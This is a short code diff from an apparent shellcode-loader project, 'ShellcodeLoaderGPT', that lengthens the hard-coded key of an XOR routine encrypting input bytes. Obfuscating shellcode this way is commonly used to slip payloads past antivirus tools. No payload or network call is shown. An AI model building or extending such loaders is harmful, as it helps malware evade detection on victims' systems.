@@ -13,7 +13,7 @@ namespace ShellcodeLoaderGPT
         static byte[] XOR(byte[] inputBytes)
         {
             // Constant key 
-            byte[] keyBytes = new byte[] { 0xAB, 0xCD, 0xEF };
+            byte[] keyBytes = new byte[] { 0xAB, 0xCD, 0xEF, 0x54, 0xde, 0xad, 0xbe, 0xef };
 
             // Create a new byte array to store the encrypted data
             byte[] encryptedBytes = new byte[inputBytes.Length];
